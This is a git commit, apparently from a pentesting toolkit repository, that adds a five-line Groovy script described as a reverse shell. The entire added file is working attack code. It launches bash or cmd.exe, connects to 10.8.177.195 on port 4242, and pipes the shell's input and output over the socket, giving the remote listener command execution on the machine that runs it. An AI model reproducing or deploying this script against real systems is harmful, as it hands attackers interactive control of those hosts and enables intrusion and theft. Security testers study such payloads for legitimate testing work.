7b079132bfeab3328a8dbe58e77d94c19c628b41
reesdanny <39764146+reesdanny@users.noreply.github.com>
2021-12-03 07:00:40 +0000

    Create GroovyRS.groovy
    Groovey script reverse shell

---
+++ Misc/Shell/GroovyRS.groovy
@@ -0,0 +1,5 @@
+String host="10.8.177.195 ";
+int port=4242;
+String cmd="bash";
+//change to "cmd.exe" for windows
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
